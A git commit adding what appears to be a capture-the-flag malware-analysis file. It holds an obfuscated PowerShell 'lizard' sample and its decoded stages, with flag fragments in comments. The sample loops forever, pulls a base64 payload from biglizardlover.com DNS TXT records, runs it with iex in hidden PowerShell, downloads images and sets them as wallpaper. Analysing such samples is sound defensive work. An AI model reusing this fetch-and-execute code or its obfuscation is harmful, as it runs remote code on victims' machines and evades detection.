4cf20e953478cbe62c2c7e356f5cd3f795847418
TheGroundZero <2406013+TheGroundZero@users.noreply.github.com>
2025-11-13 00:44:48 +0100

    Lizard

---
+++ day24/lizard/gecko_6.ps1
@@ -0,0 +1,43 @@
+while ($true) {
+    $glideelbow = iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Resolve-DnsName VFdWbllVSnZibXM9.biglizardlover.com -Type txt | Select-Object -ExpandProperty Strings))))
+    $twilightdepend = Join-Path $env:TEMP "lizard.jpg"
+    $biscuitrecognize = Get-Random -Minimum 1 -Maximum 25
+    $galaxyfeastparty = "https://biglizardlover.com/img/lizard$biscuitrecognize.jpg"
+    Invoke-WebRequest $galaxyfeastparty -OutFile $twilightdepend -ErrorAction SilentlyContinue | Out-Null
+    Add-Type -TypeDefinition "using System; using System.Runtime.InteropServices; public class W { [DllImport(`"user32.dll`")] public static extern bool SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni); }"; [W]::SystemParametersInfo(20,0,$twilightdepend,1+2) | Out-Null
+    Start-Process powershell -ArgumentList '-Command', $glideelbow -WindowStyle Hidden
+}
+$objectTest = "Wm14aFozczNOak0wTWpZNVlXVmhPRGs9"
+-/ebdEx
+
+
+while ($true) {
+    $glideelbow = <NEUTRALIZED:<NEUTRALIZED:iex>> ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Resolve-DnsName VFdWbllVSnZibXM9.biglizardlover.com -Type txt | Select-Object -ExpandProperty Strings))))
+    $twilightdepend = Join-Path $env:TEMP "lizard.jpg"
+    $biscuitrecognize = Get-Random -Minimum 1 -Maximum 25
+    $galaxyfeastparty = "https://biglizardlover.com/img/lizard$biscuitrecognize.jpg"
+    <NEUTRALIZED:Invoke-WebRequest> $galaxyfeastparty -OutFile $twilightdepend -ErrorAction SilentlyContinue | Out-Null
+    Add-Type -TypeDefinition "using System; using System.Runtime.InteropServices; public class W { [DllImport(`"user32.dll`")] public static extern bool SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni); }"; [W]::SystemParametersInfo(20,0,$twilightdepend,1+2) | Out-Null
+    <NEUTRALIZED:Start-Process> powershell -ArgumentList '-Command', $glideelbow -WindowStyle Hidden
+}
+$objectTest = "Wm14aFozczNOak0wTWpZNVlXVmhPRGs9" # flag{7634269aea89
+-/ebdEx
+
+
+# dig TXT VFdWbllVSnZibXM9.biglizardlover.com
+# JiAoICRWZXJib3NlcHJlRmVyZW5DZS50T3NUcmluRygpWzEsM10rJ1gnLWpPSW4nJykgKG5lVy1vYmpFQ3QgaW8uU3RSRUFtckVhRGVyKChuZVctb2JqRUN0IFN5c3RlTS5JTy5jT01QUmVTU2lPbi5kZWZsYVRlc3RSZWFtKCBbU3lzdEVtLmlPLm1FbW9yWVN0ckVhTV0gW0NPblZFUlRdOjpGUm9NQmFzZTY0c1RyaU5HKCdqVkpkYzZwSUV" "QMHJVN2RTdDZGR0NhQVJjV3NmVUNjcUlCcG0vSWdVRDRoRWlTSUd2TWFQOHI5dnRadmE1MzJabXVtZTdqNTl6bm1LaC9hMXAvNU5mc215V1F1TGFOTUpLblZkKzdrMWZrS3ZWUm5rTzFEUWdjSnRmdGR2Tkt4cFFUZDFkMnpETWFGaWdvYVBtSnRzK1AwUklFQkJJci9KWGJ2SlVuY1BGQktna0l0dWxQaUtMS2VEVGhtMVd1RjZQK2lPZ0VLOH" "g3UWlnTUtjQVFXaEFJVXNFUndvdkpjQmRxdkljc2t4NTQrenZNTzZyVmJJVmpsUUdIcDV5a3Vnd1B3eFBrY2RiTFhQMDdKTWlnTkdnTUlvVmtZRG9CQlVaSExYYjFhOWRnVUtUYWVuK2FiNmFUU0F3cXo0OGhQMUdqbUY1dUowdzNYOGw3bUduYU0wejl0QW9kdkh3NkMybXI0Y2JjTndjWDdEOHZ5bFMwZXpEUUlmVS95VDF1cXZPSGxkQndvc" "lpHbUNIS3k4YXpxZkcwMnMrc0JsdS9oM1htenE5U2xRTURIeHZOU2ZPMmRzcFdIUzIyd3o3TGhpQzlYRkhxTllqeEVTVU1CMU5XZDRjTTZOcG04UHJmNEVLTlN0MSsvdktSS1ZacHl6eG9hL21FRGhFUDhnMllrYTQ0THQ5S2gvV3VCVTFZNE80NlAvZmVGbmo3OEJoVVhNa01JSUpiRk1JMGFRNXNSQktZRENZTzFoMHNWdGw5dkU2R1ZmZ3dH" "aWNSeUIyMnJUMkRPdXpTTlNPUFJPYUowWXVaaTZzelI2NXMvYXRyMndlOGI1N2Rod3NPZkx2OHBOek5tMjhON2FMRGVhdlh6eGRxVUxKQ2lySVNYRzFmb2NxdjFHKzh2UlRZb1FiVytxbStwVzg1WUw4UWVKU3Q0WERtYm1BaWRQSnM0eXNvSENlamJHdDdwRitiNmpUbTk3QVFyME5FZFRNTXR1Um1Qei9lT3UzeVQ4dkUvUlg2TEVQUnFNNDF" "idExQZGZXNjFRRk1uSkczVUNFZzZ0aHdzRnYvZ294NUJseWloVmhzaVdRTE5jOEFpSWxGbk1QNktCRTJIdFBsZ1hMWTNVb1RFWmxoNFFReDRyK1VCNW9CSGxwU1FpWnA5THRGVjFocVdvT0pFa0g3dXZMT1puRnQ1OHdSOHoyYkY4NTBTZ3RQOVZKWHNpRVpBa0loRVpZSi9tZGhYbVFNTmFSUXRrRnUrVEl2bElpa1BDUjIwL21UNkZheTh0am" "1VZ0VVa2h2OGhmNURlUnlGTzVTWGE3d1NyUVF2ckVIL2R1b05WQ0NtZVFwWUNMSXZYV1lhdjFtUTg4Q1lCVWlFUklqeDJySjh0UG83YkxDSkdna3dHRlR4UnJyWUlzSzZmSW5iQ0FWSW1tS0tRcS9kOEt4VTMydldOZkRva3NrMzhBJyksW1NZU1RFbS5JTy5jT21wUkVzU0lvbi5Db01wUmVTU2lvbm1vREVdOjpkRUNvbVByZVNTKSkgLCBbd" "EV4VC5lbmNPZGluZ106OmFzY0lpKSApLnJFQURUb2VORCggKSAK
+
+# & ( $VerbosepreFerenCe.tOsTrinG()[1,3]+'X'-jOIn'') (neW-objECt io.StREAmrEaDer((neW-objECt SysteM.IO.cOMPReSSiOn.deflaTestReam( [SystEm.iO.mEmorYStrEaM] [COnVERT]::FRoMBase64sTriNG('jVJdc6pIEP0rU7dSt6FGCaARcWsfUCcqIBpm/IgUD4hEiSIGvMaP8r9vtZva532Zmume7j59znmKh/a1p/5NfsmyWQuLaNMJKnVd+7k1fkKvVRnkO1DQgcJtftdvNKxpQTd1d2zDMaFigoaPmJts+P0RIEBBIr/JXbvJUncPFBKgkItulPiKLKeDThm1WuF6P+iOgEK8x7QigMKcAQWhAIUsERwovJcBdqvIcskx54+zvMO6rVbIVjlQGHp5ykugwPwxPkcdbLXP07JMigNGgMIoVkYDoBBUZHLXb1a9dgUKTaen+ab6aTSAwqz48hP1GjmF5uJ0w3X8l7mGnaM0z9tAodvHw6C2mr4cbcNwcX7D8vylS0ezDQIfU/yT1uqvOHldBworZGmCHKy8azqfG02s+sBlu/h3Xmzq9SlQMDHxvNSfO2dspWHS22wz7LhiC9XFHqNYjxESUMB1NWd4cM6Npm8Prf4EKNSt1+/vKRKVZpyzxoa/mEDhEP8g2Yka44Lt9Kh/WuBU1Y4O46P/feFnj78BhUXMkMIIJbFMI0aQ5sRBKYDCYO1h0sVtl9vE6GVfgwGicRyB22rT2DOuzSNSOPROaJ0YuZi6szR65s/atr2we8b57dhwsOfLv8pNzNm28N7aLDeavXzxdqULJCirISXG1focqv1G+8vRTYoQbW+qm+pW85YL8QeJSt4XDmbmAidPJs4ysoHCejbGt7pF+b6jTm97AQr0NEdTMMtuRmPz/eOu3yT8vE/RX6LEPRqM41btLPdfW61QFMnJG3UCEg6thwsFv/gox5BlyihVhsiWQLNc8AiIlFnMP6KBE2HtPlgXLY3UoTEZlh4QQx4r+UB5oBHlpSQiZp9LtFV1hqWoOJEkH7uvLOZnFt58wR8z2bF850SgtP9VJXsiEZAkIhEZYJ/mdhXmQMNaRQtkFu+TIvlIikPCR20/mT6Fay8tjmUgEUkhv8hf5DeRyFO5SXa7wSrQQvrEH/duoNVCCmeQpYCLIvXWYav1mQ88CYBUiERIjx2rJ8tPo7bLCJGgkwGFTxRrrYIsK6fInbCAVImmKKQq/d8KxU32vWNfDoksk38A'),[SYSTEm.IO.cOmpREsSIon.CoMpReSSionmoDE]::dEComPreSS)) , [tExT.encOding]::ascIi) ).rEADToeND( )
+
+# $cMJzG0= "))93]rahC[,421]rahC[,63]rahC[F-)')}'+'2'+'{X}2{+]31[DiLlEhS}'+'0'+'{+]1[DiLLehS}0'+'{ '+'( & }1{)(Dn'+'e'+'oTDaeR.))iICsa::]gnIDO'+'cne'+'.T'+'XE'+'T.'+'meTS'+'Ys[ '+',))sSE'+'RPmoCED::]Edo'+'MNoiSs'+'ERP'+'MOC'+'.noisserp'+'M'+'Oc.OI'+'[,) }2{A43z'+'8KG1R90j76'+'WrqRe0zaKr1L'+'m7LKR5X1s'+'aiooB'+'DH'+'D7+J0i5tJ77Lo'+'6ANRbL+OWh'+'TP+H'+'i34F'+'Mg4'+'d'+'0Un'+'dNziXX78'+'6fT'+'D'+'iXrh44V'+'98'+'/b2/Cx'+'T1'+'iNhkmH'+'dEZ0Ln'+'Oc2c'+'a'+'P'+'1KMpKx68RJMAHU'+'4AFwwVE'+'imSSE6hS59'+'pc'+'d'+'lT3ESTEl2aHvZV'+'0JapPtRwySxNSQ'+'ZcEC'+'ae'+'A97cD'+'9UK'+'Y'+'IgN'+'aLh'+'bke7GmqIIa'+'KKT4'+'1VcN7z8t'+'mMNv'+'2cF'+'VLWia/S/1kBZJG7xQt6KK'+'5'+'ERPU9WkrNQBEo78GoZQz+ZT'+'m3'+'/7zAjM0H6BqK29+'+'ZJNV290k1NbZTu1'+'eYZK+'+'XTt'+'UUKbaJ'+'gWPt'+'0kB'+'waCGky'+'+vXM'+'EAJ8aP9Yf}2{('+'gni'+'RTs4'+'6ESa'+'BmoRF::]TrevNOC[ ]MAE'+'RTSyR'+'OMEm.Oi.Me'+'Ts'+'ys'+'[ (mAERtS'+'eTAlfED.'+'N'+'oissER'+'pM'+'oc.oI.M'+'ETsys TcEjbo'+'-W'+'en'+' ((Re'+'dAERmAe'+'RTS.Oi.MEtsYS Tc'+'Ejbo'+'-Wen ( '(( ( )''nioJ-'X'+]3,1[)EcnereferpeSOBReV$]gNirts[( (. " ; & ( $shellId[1]+$ShellID[13]+'x')([STriNg]::joIN('' , (  GEt-vARiaBLE  ('Cm'+'j'+'Zg0')).vaLUE[ - 1.. -((  GEt-vARiaBLE  ('Cm'+'j'+'Zg0')).vaLUE.LenGtH)] ))
+
+Add-Type -AssemblyName System.Speech
+Add-Type -AssemblyName System.Windows.Forms
+$SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
+$SpeechSynth.SelectVoice('Microsoft Zira Desktop')
+$lizard = Get-Date -Format tt
+while ($true) {
+    $SpeechSynth.Speak($lizard)
+    [System.Windows.Forms.MessageBox]::Show($lizard, 'Alert', 'OK', 'Information')
+}
+$UniqueRebel = "TWpVeU9UWXlORGN3ZlE9PQ==" # 252962470}
